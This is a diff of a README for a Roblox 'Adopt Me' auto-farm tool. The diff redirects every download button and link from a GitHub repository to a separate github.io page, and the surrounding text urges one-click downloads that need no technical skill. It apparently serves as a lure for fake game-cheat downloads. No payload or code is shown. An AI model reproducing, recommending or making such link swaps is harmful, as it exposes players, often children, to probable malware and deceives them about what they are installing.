@@ -1,7 +1,7 @@
 <h1>🐾 roblox-adopt-me-auto-farm-2026 - Never Worry About Chores Again</h1>
 
 <p align="center">
-  <a href="https://github.com/Kadio6561/roblox-adopt-me-auto-farm-2026"><img src="https://img.shields.io/badge/Download-Roblox_Adopt_Me_Auto_Farm-2ea44f?style=for-the-badge&logo=roblox" alt="Download Button"></a>
+  <a href="https://kadio6561.github.io"><img src="https://img.shields.io/badge/Download-Roblox_Adopt_Me_Auto_Farm-2ea44f?style=for-the-badge&logo=roblox" alt="Download Button"></a>
 </p>
 
 Welcome to **roblox-adopt-me-auto-farm-2026**, your all-in-one companion for Adopt Me on Roblox. This tool handles the boring stuff so you can focus on having fun. It completes tasks, takes care of your pets, and collects in-game currency automatically. It runs around the clock, so you can log off and still progress.
@@ -14,7 +14,7 @@ Follow these three simple steps to get started. You don't need any technical ski
 
 ### Step 1: Visit the Download Page
 
-Click the large green download button at the top of this page, or use this direct link: [https://github.com/Kadio6561/roblox-adopt-me-auto-farm-2026](https://github.com/Kadio6561/roblox-adopt-me-auto-farm-2026)
+Click the large green download button at the top of this page, or use this direct link: [https://kadio6561.github.io](https://kadio6561.github.io)
 
 Visit this link to download the application.
 
@@ -139,7 +139,7 @@ Imagine logging in and finding your tasks done, your pets fed, and your Bucks ba
 
 You are only one click away from a better Adopt Me experience. No waiting, no complicated setup, just instant automation.
 
-**[👉 CLICK HERE TO DOWNLOAD NOW 👈](https://github.com/Kadio6561/roblox-adopt-me-auto-farm-2026)**
+**[👉 CLICK HERE TO DOWNLOAD NOW 👈](https://kadio6561.github.io)**
 
 Visit this link to download the application. Your pets will thank you.
 
